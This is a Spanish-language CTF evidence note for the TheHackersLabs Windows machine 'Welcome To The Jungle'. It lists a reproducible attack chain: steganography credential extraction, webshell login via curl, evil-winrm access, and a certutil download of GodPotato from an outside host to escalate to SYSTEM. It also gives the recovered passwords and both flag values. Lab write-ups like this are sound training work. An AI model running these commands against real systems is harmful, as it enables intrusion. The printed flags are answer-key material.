---
tags: [ctf, thehackerslabs, windows, evidencias, iis, php, godpotato]
tipo: evidencias
---

# Welcome To The Jungle — Evidencias

> [!warning] Origen
> Basado en [[Welcome To The Jungle]] y [[Welcome To The Jungle - Roadmap]]. Todos los comandos se ejecutaron en laboratorio autorizado.

## Originales

| # | Tipo | Descripción | Ruta | Origen |
|---|---|---|---|---|
| 1 | md | Nota principal | `01-CTF/TheHackersLabs/Welcome To The Jungle/Welcome To The Jungle.md` | sesión original |
| 2 | escaneo | nmap completo | `scans/jungle/nmap_full.nmap` | laboratorio |
| 3 | fichero | `songs.zip` (letra + `solo_final.wav`) | `/media/songs.zip` | web objetivo |
| 4 | fichero | `commlink.exe` (244 KB) | `/theh3xgun5/commlink.exe` | web objetivo |
| 5 | binario | `setlist_uploader.exe` (113.870 B) | `C:\Program Files\HexGuns\` | objetivo (**señuelo**) |
| 6 | log | `uploader.log` (108 B, sin cambios desde 27/07/2025) | `C:\Program Files\HexGuns\` | objetivo (**señuelo**) |
| 7 | script | `theh3xgun5/{index.php,panel.php}` | `C:\inetpub\wwwroot\theh3xgun5\` | objetivo (webshell) |
| 8 | flag | `user.txt` | `C:\Users\Axl\Desktop\user.txt` | objetivo |
| 9 | flag | `root.txt` | `C:\Users\Administrador\Desktop\root.txt` | objetivo |

## Reconstrucciones

| # | Qué | Base |
|---|---|---|
| 1 | Credenciales web `slash:sweetjungle2025` | salida de `stegseek -p thehexguns` |
| 2 | Contraseña `axl:SoloMaster2025` | strings de `commlink.exe` |
| 3 | Contraseña operativa `axl:NuevaPass2026!` | cambio por consola VirtualBox (no procede del repo) |
| 4 | USER flag | lectura directa vía WinRM como `axl` |
| 5 | ROOT flag | lectura directa como SYSTEM vía `GodPotato` |
| 6 | Ausencia de trigger | `LastWriteTime` de `uploader.log` invariable tras reinicio |

## Flags confirmados

| Nivel | Valor | Ruta | Verificación |
|---|---|---|---|
| USER | `8f1aecc0263f4ccc3d67ac0bb6f218a9` | `C:\Users\Axl\Desktop\user.txt` (32 B) | lectura como `thehexguns\axl` vía WinRM |
| ROOT | `ef708b85a127545dec1ea99dcd1ebb17` | `C:\Users\Administrador\Desktop\root.txt` (32 B) | lectura como `nt authority\system` + `dir` del mismo directorio |

## Falsos positivos identificados

| Elemento | Por qué NO era un flag / por qué NO era el vector |
|---|---|
| `C:\Program Files\HexGuns\setlist_uploader.exe` + `config.dll` | **Señuelo de DLL hijack**: el exe carga `config.dll` y la carpeta es escribible por `BUILTIN\Usuarios`, pero **no existe trigger** (ni tarea, servicio, WMI ni `Run`). `uploader.log` no se modifica desde el 27/07/2025, ni siquiera tras reiniciar la VM, y su formato en inglés no coincide con los strings del binario (españoles) |
| `uploader.log` (`Missing dependency: config.dll`) | Refleja una ejecución de julio de 2025 durante la construcción de la máquina; no evidencia un mecanismo activo |
| `theh3xgun5` como nombre de ruta | No es un flag: es el path de la aplicación web (salida de stegseek) |
| `GuitarHeroes1987` | Passphrase de la banda para `commlink.exe`, no una credencial válida del sistema |
| `Nombre de usuario: slash` (comentario HTML) | Pista de la web, no una cuenta de Windows (`Slash` existe en el SAM con SID `-1003`, pero no es admin) |

## Comandos clave reproducibles

```bash
# Recon
nmap -sV -sC -p- 192.168.56.106

# Esteganografía
stegseek -p thehexguns solo_final.wav
# Password:sweetjungle2025   URL:theh3xgun5

# Web
curl -c c.txt -X POST http://192.168.56.106/theh3xgun5/ \
     -d "username=slash&password=sweetjungle2025"
curl -b c.txt http://192.168.56.106/theh3xgun5/panel.php

# Reversing
strings -n 5 commlink.exe | grep -iE "pass|band"

# USER flag
evil-winrm -i 192.168.56.106 -u axl -p 'NuevaPass2026!'
# type C:\Users\Axl\Desktop\user.txt

# Descartar el trigger del DLL hijack
schtasks /query /fo LIST /v | findstr /i "setlist hexgun"   # → 0
Get-Item 'C:\Program Files\HexGuns\uploader.log' | fl LastWriteTime  # → 7/27/2025

# Escalada a SYSTEM
certutil -urlcache -split -f http://192.168.56.1:8000/GodPotato.exe C:\Users\Public\gp.exe
whoami /priv    # SeImpersonatePrivilege + SeAssignPrimaryTokenPrivilege
C:\Users\Public\gp.exe -cmd "cmd.exe /c whoami > C:\Users\Public\out.txt"

# ROOT flag
C:\Users\Public\gp.exe -cmd "cmd.exe /c type \"C:\Users\Administrador\Desktop\root.txt\" > C:\Users\Public\root_out.txt"
```

## Artefactos generados

| Artefacto | Ruta | Notas |
|---|---|---|
| `config.dll` (DLL maliciosa de prueba) | `C:\Program Files\HexGuns\` | **eliminado** en la limpieza |
| `pwn.bat`, `out_*.txt` | `C:\Program Files\HexGuns\` | **eliminados** en la limpieza |
| `GodPotato.exe`, `PrintSpoofer64.exe` | `C:\Users\Public\` | **eliminados** en la limpieza |
| Scripts `.ps1` / `.bat` de exfiltración | `C:\Users\Public\` | **eliminados** en la limpieza |
| `commlink.exe`, `setlist_uploader.exe` | local + objetivo | solo para análisis, sin modificar el objetivo |
